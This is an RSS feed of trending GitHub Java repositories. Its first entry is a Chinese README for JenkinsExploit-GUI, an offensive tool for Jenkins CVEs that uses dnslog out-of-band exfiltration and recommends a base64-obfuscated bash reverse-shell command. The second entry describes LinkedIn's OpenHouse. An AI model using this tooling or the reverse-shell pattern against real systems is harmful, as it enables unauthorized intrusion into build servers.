<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Java Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-03-07T01:20:57Z</updated>
  <subtitle>Daily Trending of Java in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>TheBeastofwar/JenkinsExploit-GUI</title>
    <updated>2024-03-07T01:20:57Z</updated>
    <id>tag:github.com,2024-03-07:/TheBeastofwar/JenkinsExploit-GUI</id>
    <link href="https://github.com/TheBeastofwar/JenkinsExploit-GUI" rel="alternate"></link>
    <summary type="html">&lt;p&gt;一款Jenkins的综合漏洞利用工具&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;JenkinsExploit-GUI&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://socialify.git.ci/TheBeastofwar/JenkinsExploit-GUI/image?description=1&amp;amp;forks=1&amp;amp;issues=1&amp;amp;language=1&amp;amp;name=1&amp;amp;owner=1&amp;amp;stargazers=1&amp;amp;theme=Light&#34; alt=&#34;JenkinsExploit-GUI&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;一款Jenkins综合漏洞利用工具&lt;/p&gt; &#xA;&lt;h2&gt;使用&lt;/h2&gt; &#xA;&lt;h3&gt;jdk版本&lt;/h3&gt; &#xA;&lt;p&gt;在windows或linux使用jdk8的哪一个版本应该都可以,在macOS里需要jdk8u较高的版本,比如jdk8u321&lt;/p&gt; &#xA;&lt;h3&gt;外置payload&lt;/h3&gt; &#xA;&lt;p&gt;从release下载windows_tools,linux_tools或macOS_tools并放在与JenkinsExploit-GUI-*-SNAPSHOT.jar相同的目录,或者可以自行打包tools_source中的python源码文件&lt;/p&gt; &#xA;&lt;p&gt;如果是linux或macOS的话需要对外置payload进行chmod +x 赋予权限 &lt;img src=&#34;https://raw.githubusercontent.com/TheBeastofwar/JenkinsExploit-GUI/master/img/img.png&#34; alt=&#34;img.png&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/TheBeastofwar/JenkinsExploit-GUI/master/img/img_1.png&#34; alt=&#34;img_1.png&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;dnslog配置&lt;/h3&gt; &#xA;&lt;p&gt;进行dnslog设置,目前仅支持dnslog.pw和ceye.io&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/TheBeastofwar/JenkinsExploit-GUI/master/img/img_3.png&#34; alt=&#34;img_3.png&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/TheBeastofwar/JenkinsExploit-GUI/master/img/img_4.png&#34; alt=&#34;img_4.png&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;进行检测&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/TheBeastofwar/JenkinsExploit-GUI/master/img/img_2.png&#34; alt=&#34;img_2.png&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;在验证无回显命令执行的时候为了避免转义问题,推荐用如下方式进行反弹shell和dnslog外带信息&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;bash -c {echo,Y....}|{base64,-d}|{bash,-i}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;支持检测:&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CVE-2015-8103/CVE-2016-0788 Jenkins 反序列化远程代码执行 &lt;a href=&#34;https://github.com/Medicean/VulApps/tree/master/j/jenkins/1&#34;&gt;https://github.com/Medicean/VulApps/tree/master/j/jenkins/1&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CVE-2016-0792 Jenkins XStream反序列化远程代码执行 &lt;a href=&#34;https://github.com/jpiechowka/jenkins-cve-2016-0792&#34;&gt;https://github.com/jpiechowka/jenkins-cve-2016-0792&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CVE-2017-1000353 Jenkins-CI 远程代码执行漏洞 &lt;a href=&#34;https://github.com/vulhub/CVE-2017-1000353&#34;&gt;https://github.com/vulhub/CVE-2017-1000353&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CVE-2018-1000600 Jenkins GitHub SSRF+信息泄露&lt;/li&gt; &#xA; &lt;li&gt;CVE-2018-1000861 Jenkins 绕过Groovy沙盒未授权命令执行漏洞 &lt;a href=&#34;https://github.com/orangetw/awesome-jenkins-rce-2019&#34;&gt;https://github.com/orangetw/awesome-jenkins-rce-2019&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CVE-2018-1999002 Jenkins 任意文件读取 &lt;a href=&#34;https://mp.weixin.qq.com/s/MOKeN1qEBonS8bOLw6LH_w&#34;&gt;https://mp.weixin.qq.com/s/MOKeN1qEBonS8bOLw6LH_w&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CVE-2019-1003000 Jenkins 远程代码执行 &lt;a href=&#34;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&#34;&gt;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CVE-2019-1003005/CVE-2019-1003029 远程代码执行(Script Security Plugin沙箱绕过) &lt;a href=&#34;https://github.com/orangetw/awesome-jenkins-rce-2019&#34;&gt;https://github.com/orangetw/awesome-jenkins-rce-2019&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CVE-2024-23897 Jenkins CLI 接口任意文件读取漏洞 &lt;a href=&#34;https://github.com/vulhub/vulhub/raw/master/jenkins/CVE-2024-23897&#34;&gt;https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;未完待续:&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CVE-2016-9299 Jenkins ldap反序列化远程代码执行,添加poc&lt;/li&gt; &#xA; &lt;li&gt;CVE-2017-1000353 无法检测的bug&lt;/li&gt; &#xA; &lt;li&gt;继续尝试把外置的payload接入到java代码中&lt;/li&gt; &#xA; &lt;li&gt;添加批量检测功能&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;源码打包&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;mvn clean package -DskipTests&#xA;cd target&#xA;zip -d  JenkinsExploit-GUI-*-SNAPSHOT.jar &#39;META-INF/*.SF&#39; &#39;META-INF/*.RSA&#39; &#39;META-INF/*DSA&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Bug反馈&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/thebeastofwar/JenkinsExploit-GUI&#34;&gt;https://github.com/thebeastofwar/JenkinsExploit-GUI&lt;/a&gt; 提交issues&lt;/p&gt; &#xA;&lt;h2&gt;文章&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/thebeastofwar/p/17991690&#34;&gt;红队武器化开发:jenkins综合漏洞利用工具----JenkinsExploit-GUI&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;免责声明&lt;/h2&gt; &#xA;&lt;p&gt;本工具仅面向&lt;strong&gt;合法授权&lt;/strong&gt;的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。 在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。&lt;strong&gt;请勿对非授权目标进行扫描。&lt;/strong&gt; 如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。 在安装并使用本工具前，请您&lt;strong&gt;务必审慎阅读、充分理解各条款内容&lt;/strong&gt;，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。&lt;/p&gt; &#xA;&lt;h2&gt;开发日志&lt;/h2&gt; &#xA;&lt;h3&gt;v1.0&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;以yhy0师傅的模板项目 &lt;a href=&#34;https://github.com/yhy0/ExpDemo-JavaFX&#34;&gt;https://github.com/yhy0/ExpDemo-JavaFX&lt;/a&gt; 为模板,写出了jenkins综合漏洞利用工具&lt;/li&gt; &#xA; &lt;li&gt;部分python的poc还未转成java代码接入到工具中,就打包成可执行文件&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;v1.1&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;添加Jenkins指纹验证和版本获取功能,使得能够通过版本先匹配一下CVE&lt;/li&gt; &#xA; &lt;li&gt;修复进行all检测后还得再次对特定的CVE进行检测的bug(经过版本检测后直接转到对应的CVE检测)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;v1.2&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可以配置dnslog.pw或ceye.io dnslog平台来进行自动化无回显命令执行或SSRF验证&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;v1.3&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;测试在macOS上的运行情况&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Stargazers over time&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://starchart.cc/TheBeastofwar/JenkinsExploit-GUI&#34;&gt;&lt;img src=&#34;https://starchart.cc/TheBeastofwar/JenkinsExploit-GUI.svg?variant=adaptive&#34; alt=&#34;Stargazers over time&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>linkedin/openhouse</title>
    <updated>2024-03-07T01:20:57Z</updated>
    <id>tag:github.com,2024-03-07:/linkedin/openhouse</id>
    <link href="https://github.com/linkedin/openhouse" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Open Control Plane for Tables in Data Lakehouse&lt;/p&gt;&lt;hr&gt;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/linkedin/openhouse/main/docs/images/openhouse-logo.jpeg&#34; alt=&#34;OpenHouse&#34; width=&#34;400&#34; height=&#34;300&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;h3 align=&#34;center&#34;&gt; Control Plane for Tables in Open Data Lakehouses &lt;/h3&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://github.com/linkedin/openhouse/actions?query=branch%3Amain&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/actions/workflow/status/linkedin/openhouse/build-tag-publish.yml&#34; alt=&#34;CI/CD&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://github.com/linkedin/openhouse/commits/main/&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/commit-activity/m/linkedin/openhouse/main&#34; alt=&#34;Commit Activity&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://www.openhousedb.org/docs/intro/&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/docs-grey&#34; alt=&#34;Docs&#34;&gt; &lt;/a&gt; &#xA;&lt;/div&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://github.com/linkedin/openhouse&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/github-%23121011.svg?logo=github&amp;amp;logoColor=white&#34; alt=&#34;GitHub&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://join.slack.com/t/openhouse-bap9266/shared_invite/zt-2bsi0t8pi-wUOeDvQr8j8d5yl3X8WQJQ&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/Slack-4A154B?logo=slack&amp;amp;logoColor=white&#34; alt=&#34;Slack&#34;&gt; &lt;/a&gt; &#xA;&lt;/div&gt;  &#xA;&lt;p&gt;OpenHouse is an open source control plane designed for efficient management of tables within open data lakehouse deployments. The control plane comprises a &lt;strong&gt;declarative catalog&lt;/strong&gt; and a suite of &lt;strong&gt;data services&lt;/strong&gt;. Users can seamlessly define Tables, their schemas, and associated metadata declaratively within the catalog. OpenHouse reconciles the observed state of Tables with the desired state by orchestrating various data services.&lt;/p&gt;  &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/linkedin/openhouse/main/docs/images/openhouse-controlplane.jpeg&#34;&gt; &#xA;&lt;/div&gt;  &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;h3&gt;Prerequisites&lt;/h3&gt; &#xA;&lt;p&gt;For building and running locally in &lt;a href=&#34;https://raw.githubusercontent.com/linkedin/openhouse/main/SETUP.md&#34;&gt;Docker Compose&lt;/a&gt;, you would need the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.oracle.com/java/technologies/downloads/&#34;&gt;Java&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;OpenHouse is currently built with Java 8, and will be modernized soon.&lt;/li&gt; &#xA;   &lt;li&gt;Set the &lt;code&gt;JAVA_HOME&lt;/code&gt; environment variable to the location of your JDK8.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.docker.com/&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.docker.com/compose/&#34;&gt;Docker Compose&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.python.org/downloads/&#34;&gt;Python3&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For deploying OpenHouse to &lt;a href=&#34;https://raw.githubusercontent.com/linkedin/openhouse/main/DEPLOY.md&#34;&gt;Kubernetes&lt;/a&gt;, you would need the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://helm.sh/docs/intro/install/&#34;&gt;Helm&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://kubernetes.io/docs/setup/&#34;&gt;Kubernetes&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Building OpenHouse&lt;/h3&gt; &#xA;&lt;p&gt;To build OpenHouse, you can use the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./gradlew build&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Running OpenHouse with Docker Compose&lt;/h3&gt; &#xA;&lt;p&gt;To run OpenHouse, we recommend the &lt;a href=&#34;https://raw.githubusercontent.com/linkedin/openhouse/main/SETUP.md&#34;&gt;SETUP&lt;/a&gt; guide. You would bring up all the OpenHouse services, MySQL, Prometheus, Apache Spark and HDFS.&lt;/p&gt; &#xA;&lt;h3&gt;Deploying OpenHouse to Kubernetes&lt;/h3&gt; &#xA;&lt;p&gt;To deploy OpenHouse to Kubernetes, you can use the &lt;a href=&#34;https://raw.githubusercontent.com/linkedin/openhouse/main/DEPLOY.md&#34;&gt;DEPLOY&lt;/a&gt; guide. You would build the container images for all the OpenHouse services, and deploy them to a Kubernetes cluster using Helm.&lt;/p&gt; &#xA;&lt;h3&gt;Compability Matrix&lt;/h3&gt; &#xA;&lt;p&gt;OpenHouse is built with the following versions of the open-source projects:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Project&lt;/th&gt; &#xA;   &lt;th&gt;Version&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://iceberg.apache.org/releases/#120-release&#34;&gt;Apache Iceberg&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;1.2.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://spark.apache.org/releases/&#34;&gt;Apache Spark&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;3.1.2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://livy.apache.org/&#34;&gt;Apache Livy&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;0.7.0-incubating&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://hadoop.apache.org/releases.html&#34;&gt;Apache Hadoop Client&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2.10.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://spring.io/projects/spring-boot&#34;&gt;Springboot Framework&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2.6.6&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://swagger.io/specification/&#34;&gt;OpenAPI&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;3.0.3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;We welcome contributions to OpenHouse. To get involved:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Join &lt;a href=&#34;https://join.slack.com/t/openhouse-bap9266/shared_invite/zt-2bsi0t8pi-wUOeDvQr8j8d5yl3X8WQJQ&#34;&gt;OpenHouse Slack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Open &lt;a href=&#34;https://github.com/linkedin/openhouse/issues&#34;&gt;Github Issue&lt;/a&gt; for the feature or bug you want to collaborate on&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please refer to the &lt;a href=&#34;https://raw.githubusercontent.com/linkedin/openhouse/main/CONTRIBUTING.md&#34;&gt;CONTRIBUTING&lt;/a&gt; guide for more details. To get started on the high-level architecture, please refer to the &lt;a href=&#34;https://raw.githubusercontent.com/linkedin/openhouse/main/ARCHITECTURE.md&#34;&gt;ARCHITECTURE&lt;/a&gt; guide.&lt;/p&gt;</summary>
  </entry>
</feed>